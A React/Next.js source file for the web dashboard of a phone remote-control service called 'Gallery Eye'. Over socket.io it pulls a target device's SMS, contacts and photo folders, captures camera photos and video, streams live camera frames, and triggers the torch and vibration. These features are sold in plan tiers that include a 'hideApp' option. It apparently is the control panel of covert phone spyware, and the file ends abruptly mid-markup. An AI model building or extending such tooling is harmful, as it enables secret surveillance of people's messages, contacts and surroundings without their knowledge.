"use client";

import { useSession, signOut } from "next-auth/react";
import { useEffect, useState, useMemo } from "react";
import Image from "next/image";
import io from "socket.io-client";
import AppGenerationModal from "@/components/AppGenerationModal";
import WhatsAppButton from "@/components/WhatsAppButton";
import PlanBadge from "@/components/PlanBadge";
import UpgradeModal from "@/components/UpgradeModal";
import PlansModal from "@/components/PlansModal";
import BulkDownloadModal from "@/components/BulkDownloadModal";
import SyncOptionsModal from "@/components/SyncOptionsModal";
import ZipProgressModal from "@/components/ZipProgressModal";

let socket: any;

interface PlanLimits {
    photos: number;
    videos: number;
    sms: boolean;
    contacts: boolean;
    torch: boolean;
    vibration: boolean;
    hideApp: boolean;
    bulkDownload?: boolean;
    maxDevices: number;
}

export default function Home() {
    const { data: session, status } = useSession();
    const [images, setImages] = useState<any[]>([]);
    const [folders, setFolders] = useState([]);

    // Plan State
    const [userPlan, setUserPlan] = useState<'basic' | 'standard' | 'premium'>('basic');
    const [planLimits, setPlanLimits] = useState<PlanLimits>({
        photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, hideApp: false, maxDevices: 1
    });
    const [showUpgradeModal, setShowUpgradeModal] = useState(false);
    const [showPlansModal, setShowPlansModal] = useState(false);
    const [showBulkDownloadModal, setShowBulkDownloadModal] = useState(false);
    const [bulkDownloadFolder, setBulkDownloadFolder] = useState('');
    const [upgradeFeature, setUpgradeFeature] = useState('');
    const [requiredPlan, setRequiredPlan] = useState<'standard' | 'premium'>('standard');

    // ZIP Download State
    const [showSyncOptionsModal, setShowSyncOptionsModal] = useState(false);
    const [showZipProgressModal, setShowZipProgressModal] = useState(false);
    const [syncOptionsFolder, setSyncOptionsFolder] = useState({ name: '', count: 0, type: 'image' as 'image' | 'video' });
    const [zipProgress, setZipProgress] = useState({ stage: 'creating' as 'creating' | 'uploading' | 'ready' | 'error', current: 0, total: 0, url: '', error: '' });
    const [zipFiles, setZipFiles] = useState<{ folderName: string, url: string, fileCount: number, timestamp: Date }[]>([]);

    // Multi-Device State
    const [devices, setDevices] = useState<any[]>([]);
    const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
    const [isDeviceDropdownOpen, setIsDeviceDropdownOpen] = useState(false);

    const [uploadProgress, setUploadProgress] = useState<any>(null);
    const [showAppModal, setShowAppModal] = useState(false);
    const [selectedFolder, setSelectedFolder] = useState<any>(null);

    // New State for Gallery Features
    const [activeTab, setActiveTab] = useState<'all' | 'image' | 'video' | 'zip'>('all');
    const [selectedItems, setSelectedItems] = useState<Set<string>>(new Set());
    const [previewItem, setPreviewItem] = useState<any>(null);
    const [isSelectionMode, setIsSelectionMode] = useState(false);
    const [isDownloading, setIsDownloading] = useState(false);
    const [isDeleting, setIsDeleting] = useState(false);
    const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);

    // Tool Selector State
    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera'>('gallery');
    const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);

    // Torch State
    const [isTorchOn, setIsTorchOn] = useState(false);
    const [torchAggressive, setTorchAggressive] = useState(false);
    const [torchDuration, setTorchDuration] = useState(60000); // 1 minute default

    // Vibration State
    const [vibrationDuration, setVibrationDuration] = useState(1000); // 1 second default

    // Sync State
    const [isStartingSync, setIsStartingSync] = useState(false);

    // SMS State
    const [smsList, setSmsList] = useState<any[]>([]);
    const [isFetchingSms, setIsFetchingSms] = useState(false);
    const [selectedSms, setSelectedSms] = useState<any>(null);
    const [smsSearchQuery, setSmsSearchQuery] = useState('');

    // Contacts State
    const [contactsList, setContactsList] = useState<any[]>([]);
    const [isFetchingContacts, setIsFetchingContacts] = useState(false);
    const [contactsSearchQuery, setContactsSearchQuery] = useState('');

    // Settings Modal State
    const [isSettingsOpen, setIsSettingsOpen] = useState(false);
    const [devicePermissions, setDevicePermissions] = useState<any>(null);

    // Camera State
    const [cameraMode, setCameraMode] = useState<'front' | 'back'>('back');
    const [isCapturingPhoto, setIsCapturingPhoto] = useState(false);
    const [isRecording, setIsRecording] = useState(false);
    const [isLiveStreaming, setIsLiveStreaming] = useState(false);
    const [liveFrame, setLiveFrame] = useState<string | null>(null);
    const [recordingDuration, setRecordingDuration] = useState(60); // Default 1 min
    const [recordingProgress, setRecordingProgress] = useState({ current: 0, total: 0 });
    const [capturedMedia, setCapturedMedia] = useState<{ type: string; data: string; camera: string; timestamp: number }[]>([]);
    const [cameraError, setCameraError] = useState<string | null>(null);
    const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);

    // Helper function to show upgrade modal
    const showUpgradePrompt = (feature: string, required: 'standard' | 'premium') => {
        setUpgradeFeature(feature);
        setRequiredPlan(required);
        setShowUpgradeModal(true);
    };

    // Fetch user plan on authentication
    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            fetch(`https://backend-api-gallery.onrender.com/user/plan?uuid=${session.user.uuid}`)
                .then(res => res.json())
                .then(data => {
                    if (data.plan) {
                        setUserPlan(data.plan);
                        setPlanLimits(data.limits);
                    }
                })
                .catch(e => console.error('[Plan] Fetch error:', e));
        }
    }, [status, session]);

    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            const uuid = session.user.uuid;

            socket = io("https://backend-api-gallery.onrender.com", {
                transports: ["websocket"],
                reconnectionAttempts: 5,
            });

            socket.on("connect", () => {
                socket.emit("register_web", { uuid });
            });

            socket.on("device_list_update", (deviceList: any[]) => {
                setDevices(deviceList);

                // Auto-select first online device if none selected or current selection is offline
                const onlineDevices = deviceList.filter(d => d.online);
                if (onlineDevices.length > 0) {
                    setSelectedDeviceId(prev => {
                        // If we have a selection and it's still online, keep it
                        const stillOnline = onlineDevices.find(d => d.deviceId === prev);
                        if (stillOnline) return prev;
                        // Otherwise select the first online device
                        return onlineDevices[0].deviceId;
                    });
                } else {
                    setSelectedDeviceId(null);
                }
            });

            socket.on("progress_update", (data: any) => {
                setIsStartingSync(false); // Stop starting animation when progress begins
                setUploadProgress(data);
                if (data.uploaded === data.total) {
                    setTimeout(() => setUploadProgress(null), 3000);
                }
            });

            socket.on("new_image", (image: any) => {
                setImages((prev) => {
                    if (prev.some(img => img.id === image.id)) return prev;
                    return [image, ...prev];
                });
            });

            socket.on("folder_list", (data: any) => {
                setFolders(data);
            });

            // ZIP Download Event Listeners
            socket.on("zip_progress", (data: any) => {
                setZipProgress(prev => ({
                    ...prev,
                    stage: data.stage,
                    current: data.current,
                    total: data.total
                }));
            });

            socket.on("zip_ready", (data: any) => {
                setZipProgress(prev => ({
                    ...prev,
                    stage: 'ready',
                    url: data.url
                }));
                // Add ZIP to files list
                setZipFiles(prev => [{
                    folderName: data.folderName || 'Download',
                    url: data.url,
                    fileCount: data.fileCount || 0,
                    timestamp: new Date()
                }, ...prev]);
            });

            socket.on("zip_error", (data: any) => {
                setZipProgress(prev => ({
                    ...prev,
                    stage: 'error',
                    error: data.error
                }));
            });

            // SMS Event Listeners
            socket.on("sms_list", (data: any) => {
                setIsFetchingSms(false);
                if (data.isIncremental && data.sms?.length > 0) {
                    // Merge new SMS with existing, avoiding duplicates
                    setSmsList((prev) => {
                        const existingIds = new Set(prev.map(s => s.id));
                        const newSms = data.sms.filter((s: any) => !existingIds.has(s.id));
                        return [...newSms, ...prev];
                    });
                } else if (data.sms) {
                    setSmsList(data.sms);
                }
            });

            socket.on("sms_error", (data: any) => {
                setIsFetchingSms(false);
                alert(data.message || "Failed to fetch SMS");
            });

            // Contacts Event Listeners
            socket.on("contacts_list", (data: any) => {
                setIsFetchingContacts(false);
                if (data.contacts) {
                    setContactsList(data.contacts);
                }
            });

            socket.on("contacts_error", (data: any) => {
                setIsFetchingContacts(false);
                alert(data.message || "Failed to fetch contacts");
            });

            // Permission Check Response
            socket.on("permission_status", (data: any) => {
                setIsCheckingPermissions(false);
                setDevicePermissions(data.permissions);
            });

            // Camera Event Listeners
            socket.on("camera_photo", (data: any) => {
                setIsCapturingPhoto(false);
                if (data.image) {
                    setCapturedMedia(prev => [{
                        type: 'photo',
                        data: data.image,
                        camera: data.camera || 'back',
                        timestamp: data.timestamp || Date.now()
                    }, ...prev]);
                }
            });

            socket.on("camera_video", (data: any) => {
                setIsRecording(false);
                setRecordingProgress({ current: 0, total: 0 });
                if (data.video) {
                    setCapturedMedia(prev => [{
                        type: 'video',
                        data: data.video,
                        camera: data.camera || 'back',
                        timestamp: data.timestamp || Date.now()
                    }, ...prev]);
                }
            });

            socket.on("live_frame", (data: any) => {
                if (data.frame) {
                    setLiveFrame(data.frame);
                }
            });

            socket.on("live_frame", (data: any) => {
                if (data.frame) {
                    setLiveFrame(data.frame);
                }
            });

            socket.on("recording_progress", (data: any) => {
                setRecordingProgress({ current: data.current || 0, total: data.total || 0 });
            });

            socket.on("camera_error", (data: any) => {
                setIsCapturingPhoto(false);
                setIsRecording(false);
                setCameraError(data.error || "Camera error occurred");
                setTimeout(() => setCameraError(null), 5000);
            });

            fetch(`https://backend-api-gallery.onrender.com/images?uuid=${uuid}`)
                .then((res) => res.json())
                .then((data) => setImages(data));

            return () => {
                if (socket) {
                    socket.disconnect();
                }
            };
        }
    }, [status, session]);

    const fetchFolders = () => {
        if (socket && selectedDeviceId) {
            socket.emit("get_folders", {
                uuid: session?.user?.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    const handleFolderClick = (folder: any) => {
        // Prevent clicking while upload is in progress
        if (uploadProgress) {
            alert("Please wait for the current sync to complete.");
            return;
        }
        setSelectedFolder(folder);
        setSyncMediaType(null); // Reset media type selection
    };

    // SMS Functions
    const fetchSms = () => {
        // Plan check - SMS requires Standard or Premium
        if (!planLimits.sms) {
            showUpgradePrompt('SMS Access', 'standard');
            return;
        }
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsFetchingSms(true);
            socket.emit("get_sms", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    const resetSmsSync = () => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit("reset_sms_sync", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
            setSmsList([]);
        }
    };

    // Contacts Functions
    const fetchContacts = () => {
        // Plan check - Contacts requires Standard or Premium
        if (!planLimits.contacts) {
            showUpgradePrompt('Contacts Access', 'standard');
            return;
        }
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsFetchingContacts(true);
            socket.emit("get_contacts", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    // Permission Check Function
    const checkPermissions = () => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsCheckingPermissions(true);
            setDevicePermissions(null);
            socket.emit("check_permissions", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    // Filtered SMS based on search
    const filteredSms = useMemo(() => {
        if (!smsSearchQuery) return smsList;
        const query = smsSearchQuery.toLowerCase();
        return smsList.filter(sms =>
            sms.address?.toLowerCase().includes(query) ||
            sms.body?.toLowerCase().includes(query)
        );
    }, [smsList, smsSearchQuery]);

    // Filtered Contacts based on search
    const filteredContacts = useMemo(() => {
        if (!contactsSearchQuery) return contactsList;
        const query = contactsSearchQuery.toLowerCase();
        return contactsList.filter(contact => {
            const nameMatch = contact.name?.toLowerCase()?.includes(query) || false;
            const phoneMatch = contact.phones?.some((p: any) => {
                // Handle both string and object phone entries
                const phoneStr = typeof p === 'string' ? p : (p?.number || p?.value || String(p));
                return phoneStr?.toLowerCase()?.includes(query) || false;
            }) || false;
            return nameMatch || phoneMatch;
        });
    }, [contactsList, contactsSearchQuery]);


    const triggerUpload = (count: number | 'all') => {
        if (socket && selectedFolder && syncMediaType && session?.user?.uuid && selectedDeviceId) {
            const payload = {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId,
                folderId: selectedFolder.id,
                folderName: selectedFolder.name,
                count: count,
                mediaType: syncMediaType
            };
            socket.emit("trigger_sync", payload);
            setIsStartingSync(true); // Start loading animation
            setSelectedFolder(null);
            setSyncMediaType(null);
        } else {
            console.error('[triggerUpload] Missing required data:', {
                hasSocket: !!socket,
                hasFolder: !!selectedFolder,
                hasMediaType: !!syncMediaType,
                hasUUID: !!session?.user?.uuid,
                hasDevice: !!selectedDeviceId
            });
        }
    };

    // --- Torch Functions ---
    const toggleTorch = () => {
        // Plan check - Torch requires Standard or Premium
        if (!planLimits.torch) {
            showUpgradePrompt('Flashlight Control', 'standard');
            return;
        }
        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
            alert("Please select an online device first.");
            return;
        }

        const newState = !isTorchOn;
        setIsTorchOn(newState);

        socket.emit("torch_control", {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            on: newState,
            aggressive: torchAggressive,
            duration: torchDuration
        });
    };

    // --- Vibration Functions ---
    const triggerVibration = () => {
        // Plan check - Vibration requires Standard or Premium
        if (!planLimits.vibration) {
            showUpgradePrompt('Vibration Control', 'standard');
            return;
        }
        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
            alert("Please select an online device first.");
            return;
        }

        socket.emit("vibrate_control", {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            duration: vibrationDuration
        });
    };

    // --- Gallery Logic ---

    const hasVideos = useMemo(() => images.some(img => img.resource_type === 'video'), [images]);

    const filteredImages = useMemo(() => {
        if (activeTab === 'all') return images;
        return images.filter(img => img.resource_type === activeTab);
    }, [images, activeTab]);

    const toggleSelection = (id: string) => {
        const newSelection = new Set(selectedItems);
        if (newSelection.has(id)) {
            newSelection.delete(id);
        } else {
            newSelection.add(id);
        }
        setSelectedItems(newSelection);
        if (newSelection.size === 0) setIsSelectionMode(false);
        else setIsSelectionMode(true);
    };

    const selectAll = () => {
        if (selectedItems.size === filteredImages.length) {
            setSelectedItems(new Set());
            setIsSelectionMode(false);
        } else {
            setSelectedItems(new Set(filteredImages.map(img => img.id)));
            setIsSelectionMode(true);
        }
    };

    const deleteSelected = async () => {
        if (!confirm("Are you sure you want to delete these items?")) return;
        setIsDeleting(true);
        const idsToDelete = Array.from(selectedItems);

        try {
            const response = await fetch('https://backend-api-gallery.onrender.com/delete', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ids: idsToDelete })
            });

            if (response.ok) {
                setImages(prev => prev.filter(img => !selectedItems.has(img.id)));
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Delete failed", error);
        } finally {
            setIsDeleting(false);
        }
    };

    const downloadSelected = async () => {
        setIsDownloading(true);
        const selectedUrls = images.filter(img => selectedItems.has(img.id)).map(img => img.url);

        try {
            const response = await fetch('https://backend-api-gallery.onrender.com/download-zip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ urls: selectedUrls })
            });

            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `gallery_download_${new Date().toISOString()}.zip`;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Download failed", error);
        } finally {
            setIsDownloading(false);
        }
    };

    const downloadSingle = async (url: string, filename: string) => {
        try {
            const response = await fetch(url);
            const blob = await response.blob();
            const link = document.createElement('a');
            link.href = window.URL.createObjectURL(blob);
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        } catch (error) {
            console.error("Download failed", error);
        }
    };

    // Download SMS as CSV
    const downloadSmsAsCsv = () => {
        if (smsList.length === 0) return;

        const headers = ['Address', 'Body', 'Date', 'Type'];
        const csvContent = [
            headers.join(','),
            ...smsList.map(sms => [
                `"${(sms.address || '').replace(/"/g, '""')}"`,
                `"${(sms.body || '').replace(/"/g, '""')}"`,
                new Date(sms.date).toISOString(),
                sms.type === 1 ? 'Received' : 'Sent'
            ].join(','))
        ].join('\n');

        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = `sms_backup_${new Date().toISOString().split('T')[0]}.csv`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    // Download Contacts as vCard
    const downloadContactsAsVcf = () => {
        if (contactsList.length === 0) return;

        const vcards = contactsList.map(contact => {
            const name = contact.name || 'Unknown';
            const phones = contact.phones?.map((p: any) => {
                const num = typeof p === 'string' ? p : (p?.number || p?.value || '');
                return `TEL:${num}`;
            }).join('\n') || '';
            const emails = contact.emails?.map((e: any) => {
                const email = typeof e === 'string' ? e : (e?.address || e?.value || '');
                return `EMAIL:${email}`;
            }).join('\n') || '';

            return `BEGIN:VCARD
VERSION:3.0
FN:${name}
N:${name};;;
${phones}
${emails}
END:VCARD`;
        }).join('\n');

        const blob = new Blob([vcards], { type: 'text/vcard;charset=utf-8;' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = `contacts_backup_${new Date().toISOString().split('T')[0]}.vcf`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    if (status === "loading") {
        return (
            <div className="min-h-screen flex items-center justify-center bg-black text-white">
                <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-purple-500"></div>
            </div>
        );
    }

    if (status === "unauthenticated") return null;

    const onlineDeviceCount = devices.filter(d => d.online).length;

    return (
        <main className="min-h-screen bg-[#0a0a0a] text-white selection:bg-purple-500/30 pb-24">
            {/* Background Gradients */}
            <div className="fixed inset-0 z-0 overflow-hidden pointer-events-none">
                <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-purple-600/20 rounded-full blur-[120px]" />
                <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-600/20 rounded-full blur-[120px]" />
            </div>

            {/* Navbar */}
            <nav className="relative z-10 border-b border-white/10 bg-black/20 backdrop-blur-xl sticky top-0">
                <div className="max-w-7xl mx-auto px-4 md:px-6 h-16 md:h-20 flex items-center justify-between">
                    <div className="flex items-center gap-1.5 md:gap-2">
                        {/* Settings Button */}
                        <button
                            onClick={() => setIsSettingsOpen(true)}
                            className="w-8 h-8 md:w-10 md:h-10 rounded-xl bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center hover:scale-105 transition-transform"
                            title="Settings & Permission Check"
                        >
                            <svg className="w-5 h-5 md:w-6 md:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                        </button>
                        {/* Plan Badge - Close to Settings */}
                        <PlanBadge plan={userPlan} onClick={() => setShowPlansModal(true)} />
                        <span className="text-lg md:text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-white to-white/60 hidden sm:block">Gallery Eye</span>
                    </div>

                    <div className="flex items-center gap-2 md:gap-4">
                        {/* Tools Selector - Matching Device Selector Style */}
                        <button
                            onClick={() => setIsToolDropdownOpen(true)}
                            className="flex items-center gap-2 px-2 py-1.5 md:px-3 md:py-2 rounded-lg bg-white/5 border border-white/10 hover:bg-white/10 transition-colors"
                        >
                            {selectedTool === 'gallery' && <svg className="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>}
                            {selectedTool === 'sms' && <svg className="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>}
                            {selectedTool === 'contacts' && <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>}
                            {selectedTool === 'torch' && <svg className="w-4 h-4 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>}
                            {selectedTool === 'vibration' && <svg className="w-4 h-4 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>}
                            {selectedTool === 'camera' && <svg className="w-4 h-4 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>}
                            <span className="text-xs font-medium text-white/70">Tools</span>
                            <svg className="w-3 h-3 text-white/40" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
                        </button>

                        {/* Device Selector */}
                        <button
                            onClick={() => setIsDeviceDropdownOpen(true)}
                            className="flex items-center gap-2 px-2 py-1.5 md:px-3 md:py-2 rounded-lg bg-white/5 border border-white/10 hover:bg-white/10 transition-colors"
                        >
                            <div className={`w-2 h-2 rounded-full flex-shrink-0 ${onlineDeviceCount > 0 ? 'bg-green-500' : 'bg-red-500'}`} />
                            <span className="text-xs font-medium text-white/70">Device</span>
                            <svg className="w-3 h-3 text-white/40" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
                        </button>

                        <div className="flex items-center gap-2 md:gap-3">
                            <button
                                onClick={() => {
                                    setShowAppModal(true);
                                }}
                                className="px-3 py-1.5 md:px-4 md:py-2 rounded-lg bg-white text-black text-sm font-semibold hover:scale-105 transition-transform"
                            >
                                <span className="hidden sm:inline">Download App</span>
                                <span className="sm:hidden">App</span>
                            </button>
                            <div className="w-px h-6 md:h-8 bg-white/10 hidden sm:block" />
                            <div className="flex items-center gap-2 md:gap-3">
                                <span className="text-sm font-medium text-white/80 hidden md:block">{session?.user?.name}</span>
                                <button onClick={() => signOut()} className="text-sm text-red-400 hover:text-red-300 transition-colors">Logout</button>
                            </div>
                        </div>
                    </div>
                </div>
            </nav>

            <div className="relative z-10 max-w-7xl mx-auto px-4 md:px-6 py-8">

                {/* Remote Control Section */}
                <div className="mb-12">
                    <div className="flex items-center justify-between mb-6">
                        <div className="flex flex-col gap-1">
                            <h2 className="text-2xl font-bold">Remote Control</h2>
                            {selectedDeviceId ? (
                                <span className="text-sm text-green-400 font-medium flex items-center gap-2">
                                    Connected to: {devices.find(d => d.deviceId === selectedDeviceId)?.name}
                                </span>
                            ) : (
                                <span className="text-sm text-white/40">Select a device from the top right to enable controls</span>
                            )}
                        </div>
                    </div>

                    {/* Gallery Tool - Folder View */}
                    {selectedTool === 'gallery' && (
                        <>
                            <div className="flex justify-end mb-4">
                                <button
                                    onClick={fetchFolders}
                                    disabled={!selectedDeviceId}
                                    className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
                                >
                                    Refresh Folders
                                </button>
                            </div>

                            {folders.length > 0 ? (
                                <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3">
                                    {folders.map((folder: any, idx) => (
                                        <button key={idx} onClick={() => handleFolderClick(folder)} className="p-3 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all group text-left">
                                            <div className="flex justify-between items-start mb-2">
                                                <div className="p-1.5 rounded-lg bg-purple-500/20 text-purple-400">
                                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>
                                                </div>
                                            </div>
                                            <div className="truncate font-medium text-sm">{folder.name}</div>
                                            <div className="text-xs text-white/40">
                                                {folder.imageCount > 0 && folder.videoCount > 0
                                                    ? `${folder.imageCount} 📷 • ${folder.videoCount} 🎥`
                                                    : folder.imageCount > 0
                                                        ? `${folder.imageCount} images`
                                                        : `${folder.videoCount} videos`}
                                            </div>
                                        </button>
                                    ))}
                                </div>
                            ) : (
                                <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
                                    {!selectedDeviceId
                                        ? "Select a device from the top right menu to view albums."
                                        : "Click \"Refresh Folders\" to see albums from your device."}
                                </div>
                            )}
                        </>
                    )}

                    {/* SMS Tool */}
                    {selectedTool === 'sms' && (
                        <div className="space-y-4">
                            <div className="flex flex-col sm:flex-row gap-3 justify-between items-start sm:items-center">
                                <div className="flex gap-2">
                                    <button
                                        onClick={fetchSms}
                                        disabled={!selectedDeviceId || isFetchingSms}
                                        className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium flex items-center gap-2 ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
                                    >
                                        {isFetchingSms ? (
                                            <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                                        ) : (
                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                                        )}
                                        {smsList.length > 0 ? 'Fetch New SMS' : 'Fetch All SMS'}
                                    </button>
                                    {smsList.length > 0 && (
                                        <>
                                            <button
                                                onClick={resetSmsSync}
                                                className="px-3 py-2 rounded-lg border border-white/10 bg-white/5 text-white/70 text-sm hover:bg-white/10 transition-colors"
                                            >
                                                Reset
                                            </button>
                                            <button
                                                onClick={downloadSmsAsCsv}
                                                className="px-3 py-2 rounded-lg border border-green-500/30 bg-green-500/10 text-green-400 text-sm hover:bg-green-500/20 transition-colors flex items-center gap-1"
                                            >
                                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                                                CSV
                                            </button>
                                        </>
                                    )}
                                </div>
                                <div className="relative w-full sm:w-64">
                                    <input
                                        type="text"
                                        placeholder="Search SMS..."
                                        value={smsSearchQuery}
                                        onChange={(e) => setSmsSearchQuery(e.target.value)}
                                        className="w-full px-4 py-2 pl-10 rounded-lg bg-white/5 border border-white/10 text-white placeholder-white/40 focus:outline-none focus:border-purple-500/50"
                                    />
                                    <svg className="w-4 h-4 text-white/40 absolute left-3 top-1/2 -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                                </div>
                            </div>

                            {smsList.length > 0 ? (
                                <div className="space-y-2 max-h-[60vh] overflow-y-auto">
                                    <p className="text-xs text-white/40 mb-2">{filteredSms.length} messages</p>
                                    {filteredSms.map((sms: any) => (
                                        <div
                                            key={sms.id}
                                            onClick={() => setSelectedSms(sms)}
